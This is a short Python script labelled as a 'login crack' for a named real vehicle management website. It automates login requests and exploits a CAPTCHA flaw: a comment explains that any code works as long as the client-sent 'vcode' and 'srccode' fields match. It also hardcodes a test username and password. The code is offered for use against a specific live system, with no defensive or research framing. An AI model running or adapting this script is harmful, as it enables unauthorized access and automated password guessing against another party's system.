"""
┌─┐┬ ┬ ┬┌─┐┬┌─┬ ┬┌─┐┬─┐
├┤ │ └┬┘└─┐├┴┐└┬┘├┤ ├┬┘
└  ┴─┘┴ └─┘┴ ┴ ┴ └─┘┴└─
Time    : 2022-07-17 14:27
Topic   : 民航协发车辆管理系统登录破解
            http://www.cimc-xf.com/index.php
"""

import requests

sess = requests.session()


def init_index():
    """
    初始化请求
    :return:
    """
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;'
                  'q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/103.0.0.0 Safari/537.36',
    }

    response = sess.get('http://www.cimc-xf.com/index.php', headers=headers, verify=False)

    return response


def second_index():
    """
    初始化请求第二步
    :return:
    """
    # 由于采用全局session，所以这里cookies不用带入
    # cookies = {
    #     'advanced-frontend': 'ch5pmunkpf3af9ga036keh9qm5',
    # }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;'
                  'q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/103.0.0.0 Safari/537.36',
    }

    params = {
        'r': 'login/index',
    }

    response = sess.get('http://www.cimc-xf.com/index.php', params=params, headers=headers, verify=False)

    return response


def login(username, password, vcode, srccode):
    """
    模拟登录
    :param username: 用户名
    :param password: 密码
    :param vcode: 验证码
    :param srccode: 校验码
    :return:
    """
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'http://www.cimc-xf.com',
        'Pragma': 'no-cache',
        'Referer': 'http://www.cimc-xf.com/index.php?r=login%2Findex',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/103.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }

    params = {
        'r': 'login/do-login',
    }

    data = {
        'uname': username,
        'pwd': password,
        'vcode': vcode,
        # 这个验证码随便写，vcode 与 srccode相一致即可登录成功
        'srccode': srccode,
    }

    response = sess.post('http://www.cimc-xf.com/index.php', params=params, headers=headers, data=data, verify=False)

    return response


if __name__ == '__main__':
    ########## 初始化这两步可以省略 ##########
    # # 初始化请求
    # init_index()
    #
    # # 初始化请求第二步
    # second_index()
    ########## 初始化这两步可以省略 ##########

    # 模拟登录
    resp = login('test', 'A@cca123456', 'dddd', 'dddd')

    if resp.text == '1':
        print('登录成功！')
    elif resp.text == '2':
        print('用户名或密码错误！')
    elif resp.text == '3':
        print('验证码不正确！')
    elif resp.text == '4':
        print('请联系管理员分配权限！')
    elif resp.text == '5':
        print('密码长度8-16位，包括至少一个大写字母，小写字母，数字，特殊字符(!@#$%^&*?)！')
    elif resp.text == '6':
        print('账号长度最大20！')
